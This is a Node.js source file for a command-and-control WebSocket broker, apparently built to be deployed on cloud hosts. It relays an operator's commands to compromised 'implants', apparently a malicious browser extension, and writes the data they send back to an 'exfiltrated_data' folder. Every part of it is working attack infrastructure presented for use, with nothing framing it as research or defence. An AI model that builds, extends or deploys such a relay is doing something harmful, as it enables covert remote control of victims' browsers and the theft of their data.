// ============================================================
// C2 WebSocket Broker — Cloud Relay Server
// Deployable to: Railway, Render, Fly.io, DigitalOcean, AWS EC2
// ============================================================
// Both the C2 controller (server.js) and implants (extension)
// connect here. The broker pairs them by a shared session TOKEN.
// ============================================================

const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

// ---- Configuration ----
const PORT = process.env.PORT || 8080;
const AUTH_TOKEN = process.env.C2_TOKEN || 'changeme-super-secret-token-2026';
const LOG_DIR = path.join(__dirname, 'exfiltrated_data');

if (!fs.existsSync(LOG_DIR)) {
  fs.mkdirSync(LOG_DIR, { recursive: true });
}

// ---- WebSocket ----
// Use dynamic import for 'ws' if needed, or just require it
let WebSocket;
try {
  WebSocket = require('ws');
} catch {
  console.error('ERROR: Install ws: npm install ws');
  process.exit(1);
}

// ---- State ----
// controllers: Map<token, WebSocket> — your C2 server.js connects as controller
// implants: Map<token, WebSocket[]> — multiple implants can share same token
// implantMetadata: Map<token, Array<{socket, id, info}>>
const controllers = new Map();
const implants = new Map();

// ---- Logging ----
function log(data, label = 'INFO') {
  const ts = new Date().toISOString();
  const msg = typeof data === 'string' ? data : JSON.stringify(data).substring(0, 300);
  console.log(`[${ts}] [${label}] ${msg}`);
}

function saveExfil(clientId, type, payload) {
  const ts = new Date().toISOString().replace(/[:.]/g, '-');
  const filename = `${type}_${clientId}_${ts}.json`;
  const filepath = path.join(LOG_DIR, filename);
  fs.writeFileSync(filepath, JSON.stringify(payload, null, 2));
  log(`Saved ${type} → ${filename}`, 'EXFIL');
}

// ---- HTTP Server ----
const server = http.createServer((req, res) => {
  if (req.url === '/') {
    const html = `
    <html><head><title>C2 Broker</title></head>
    <body style="font-family:monospace;padding:2rem;">
      <h1>🔌 C2 WebSocket Broker</h1>
      <p>Status: <span style="color:green;font-weight:bold;">RUNNING</span></p>
      <p>Controllers: ${controllers.size}</p>
      <p>Implants: ${Array.from(implants.values()).reduce((a, c) => a + c.length, 0)}</p>
      <p>Exfiltrated: ${fs.readdirSync(LOG_DIR).length} files</p>
      <hr/>
      <p>Controller connects with <code>?role=controller&token=YOUR_TOKEN</code></p>
      <p>Implant connects with <code>?role=implant&token=YOUR_TOKEN</code></p>
      <p>Set token via env: <code>C2_TOKEN=your-secret</code></p>
      <p>WebSocket endpoint: <code>ws://${req.headers.host}/</code></p>
    </body></html>`;
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(html);
  } else if (req.url === '/health') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      status: 'ok',
      controllers: controllers.size,
      implants: Array.from(implants.values()).reduce((a, c) => a + c.length, 0),
      exfiltrated: fs.readdirSync(LOG_DIR).length
    }));
  } else if (req.url === '/log') {
    try {
      const files = fs.readdirSync(LOG_DIR).sort().reverse().slice(0, 50);
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end(files.join('\n') || 'No files yet');
    } catch (e) {
      res.writeHead(500);
      res.end(e.message);
    }
  } else {
    res.writeHead(404);
    res.end('Not found');
  }
});

// ---- WebSocket Server ----
const wss = new WebSocket.Server({ server });

function extractQuery(url) {
  const idx = url.indexOf('?');
  if (idx === -1) return {};
  const qs = url.substring(idx + 1);
  const params = {};
  qs.split('&').forEach(p => {
    const [k, v] = p.split('=');
    params[decodeURIComponent(k)] = decodeURIComponent(v || '');
  });
  return params;
}

wss.on('connection', (ws, req) => {
  const params = extractQuery(req.url);
  const role = params.role;       // 'controller' or 'implant'
  const token = params.token;     // shared auth token
  const clientAddr = req.socket.remoteAddress;

  // ---- Auth ----
  if (!role || !token) {
    log(`Rejected: missing role/token from ${clientAddr}`, 'AUTH_FAIL');
    ws.close(4001, 'Missing role or token');
    return;
  }

  if (token !== AUTH_TOKEN) {
    log(`Rejected: invalid token from ${clientAddr} (role=${role})`, 'AUTH_FAIL');
    ws.close(4002, 'Invalid token');
    return;
  }

  const clientId = `${clientAddr}:${Date.now()}`;

  // ---- Controller Registration ----
  if (role === 'controller') {
    // Only one controller per token (the latest replaces)
    const oldController = controllers.get(token);
    if (oldController && oldController.readyState === WebSocket.OPEN) {
      log(`Replacing existing controller for token`, 'CONTROLLER');
      oldController.close(1000, 'Replaced by new controller');
    }
    controllers.set(token, ws);
    log(`Controller connected: ${clientAddr} (token: ${token.substring(0, 8)}...)`, 'CONTROLLER');

    // Notify controller of connected implants count
    const implantCount = (implants.get(token) || []).length;
    if (implantCount > 0) {
      ws.send(JSON.stringify({
        type: 'status',
        connectedImplants: implantCount,
        message: `${implantCount} implant(s) connected`
      }));
    }

    ws.on('close', () => {
      if (controllers.get(token) === ws) {
        controllers.delete(token);
        log(`Controller disconnected: ${clientAddr}`, 'CONTROLLER');
      }
    });

    ws.on('message', (raw) => {
      try {
        const msg = JSON.parse(raw.toString());

        // Forward commands to ALL implants with this token
        const tokenImplants = implants.get(token) || [];
        if (tokenImplants.length === 0) {
          log(`No implants connected for token, queuing...`, 'CONTROLLER');
          ws.send(JSON.stringify({
            type: 'status',
            connectedImplants: 0,
            message: 'No implants connected. Command will be queued.'
          }));
          return;
        }

        // If msg has targetImplantId, send to specific implant
        let targets = tokenImplants;
        if (msg.targetImplantId) {
          targets = tokenImplants.filter(i => i.id === msg.targetImplantId);
        }

        const relayMsg = JSON.stringify({
          ...msg,
          _relayed: true,
          _from: 'controller'
        });

        let sent = 0;
        for (const implant of targets) {
          if (implant.socket.readyState === WebSocket.OPEN) {
            implant.socket.send(relayMsg);
            sent++;
          }
        }
        log(`Forwarded ${msg.command || msg.type || 'message'} to ${sent}/${targets.length} implant(s)`, 'RELAY');
      } catch (e) {
        log(`Controller message error: ${e.message}`, 'ERROR');
      }
    });

    ws.on('error', () => {});
    return;
  }

  // ---- Implant Registration ----
  if (role === 'implant') {
    if (!implants.has(token)) {
      implants.set(token, []);
    }
    const implantInfo = {
      socket: ws,
      id: clientId,
      connectedAt: Date.now(),
      info: params.info || 'unknown'
    };
    implants.get(token).push(implantInfo);
    log(`Implant connected: ${clientAddr} (id: ${clientId})`, 'IMPLANT');

    // Notify the controller
    const controller = controllers.get(token);
    if (controller && controller.readyState === WebSocket.OPEN) {
      controller.send(JSON.stringify({
        type: 'implant_connected',
        implantId: clientId,
        connectedImplants: implants.get(token).length
      }));
    }

    ws.on('close', () => {
      const list = implants.get(token);
      if (list) {
        const idx = list.findIndex(i => i.id === clientId);
        if (idx !== -1) list.splice(idx, 1);
        if (list.length === 0) implants.delete(token);
      }
      log(`Implant disconnected: ${clientId} (remaining: ${(implants.get(token) || []).length})`, 'IMPLANT');

      // Notify the controller
      const ctrl = controllers.get(token);
      if (ctrl && ctrl.readyState === WebSocket.OPEN) {
        ctrl.send(JSON.stringify({
          type: 'implant_disconnected',
          implantId: clientId,
          connectedImplants: (implants.get(token) || []).length
        }));
      }
    });

    ws.on('message', (raw) => {
      try {
        const msg = JSON.parse(raw.toString());
        log(`Message from implant ${clientId}: ${JSON.stringify(msg).substring(0, 200)}`, 'IMPLANT_MSG');

        // Forward responses back to controller
        const controller = controllers.get(token);
        if (controller && controller.readyState === WebSocket.OPEN) {
          controller.send(JSON.stringify({
            ...msg,
            _fromImplant: clientId,
            _relayed: true
          }));
        }

        // Save exfiltrated data when it's a response or chunk
        if ((msg.type === 'response' || msg.type === 'chunk') && msg.payload) {
          saveExfil(clientId, msg.command || 'unknown', msg.payload);
        }
      } catch (e) {
        log(`Implant message error: ${e.message}`, 'ERROR');
      }
    });

    ws.on('error', () => {});
    return;
  }

  // Unknown role
  log(`Rejected: unknown role "${role}" from ${clientAddr}`, 'AUTH_FAIL');
  ws.close(4003, 'Unknown role');
});

// ---- Start ----
server.listen(PORT, '0.0.0.0', () => {
  log(`C2 Broker listening on port ${PORT}`, 'STARTUP');
  console.log(`\n=================================================`);
  console.log(`  C2 WebSocket Broker`);
  console.log(`  Endpoint: ws://0.0.0.0:${PORT}`);
  console.log(`  Token: ${AUTH_TOKEN.substring(0, 4)}...${AUTH_TOKEN.slice(-4)}`);
  console.log(`  HTTP:    http://0.0.0.0:${PORT}/`);
  console.log(`  Health:  http://0.0.0.0:${PORT}/health`);
  console.log(`=================================================\n`);
});
